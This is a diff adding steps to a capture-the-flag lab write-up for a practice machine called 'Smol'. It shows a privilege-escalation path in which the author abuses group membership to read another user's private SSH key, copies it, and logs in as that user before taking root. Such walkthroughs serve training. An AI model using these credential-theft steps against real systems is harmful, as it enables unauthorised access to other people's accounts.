@@ -195,6 +195,32 @@ cat /home/diego/user.txt
 
 Couldn’t unzip on target (permission issue), so:
 
+Privilege Escalation Path – Internal Group Access
+
+Running id as diego:
+
+```
+id
+diego is part of the 'internal' group
+```
+Listing Other User Profiles
+
+```
+ls -la /home/think
+```
+As diego (member of internal), you can read think's .ssh folder:
+```
+cat /home/think/.ssh/id_rsa > id_rsa
+chmod 600 id_rsa
+```
+SSH as Think
+
+```
+ssh -i id_rsa think@smoi.thm
+```
+
+SSH successful!
+
 * Switched to `think` via SSH key access
 
 ![Landing Page](images/Smol/img10.jpg)
@@ -253,6 +279,8 @@ sudo su -
 ```
 
 Captured root flag:
+
+![Landing Page](images/Smol/img12.jpg)
 
 ```bash
 cat /root/root.txt
